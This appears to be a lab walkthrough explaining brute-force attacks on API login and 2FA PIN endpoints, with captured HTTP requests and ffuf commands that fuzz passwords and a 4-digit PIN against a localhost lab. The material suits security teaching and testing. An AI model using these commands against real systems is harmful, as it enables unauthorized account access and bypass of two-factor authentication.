# Brute Force Attack 

Brute Force attack in APIs is a techniques where the attacker systematically tries a large number of possible values typically username,password,API keys, or parameters to gain unauthorized access or discover hidden functionality. Brute Force relies on trial and error, often automated with scripts or tools

Brute Force generally happens because of 
- Lack of Rate Limiting, Account lockouts
- Weak credentials, weak or no multi factor authentication
- Short OTPs or PINs for multi factor authentication without rate limiting and timeouts

Here in our lab scenario we have two endpoints which is vulnerable to the bruteforce attacks

1. Login - `/api/v1/login`
2. 2FA after login to get the JWT token - `/api/v1/pin-verify`

---

We can use Burpsuite intruder for the brute force attack but the community edition is slower so we can use the `ffuf` tool to do faster

1. **Login endpoint**

Capture ans save the login request in a text file and start bruteforcing the username and password

```
# save the request in text file
$ cat req.txt

POST /api/v1/login HTTP/1.1
Host: localhost:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 47

{
"username":"jane",
"password":"FUZZ"
}

# use ffuf to brute force the username and password
ffuf -request req.txt -request-proto http -w <wordlist> -mc 200 
```

2. **JWT token generator endpoint**

Capture and save the request for the 2FA which contain the `pin` parameter in a text file and test multiple values for the pin to find the valid one

```
# save the request
$ cat req1.txt

POST /api/v1/pin-verify HTTP/1.1
Host: localhost:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Priority: u=0, i
Content-Length: 18

{
"pin":"FUZZ"
}

# Here in the lab we have 4 digit pin so generate the wordlist for it
$ seq -w 0000 9999 > num.txt

# use ffuf to bruteforce
ffuf -request req1.txt -request-proto http -w num.txt -mc 200 
```

> Note:
> - Brute force attacks can generate significant noise in network traffic which making them detectable through proper monitoring and logging
> - Successful result only happen in the case where the wordlist has the correct credential or value exist in it
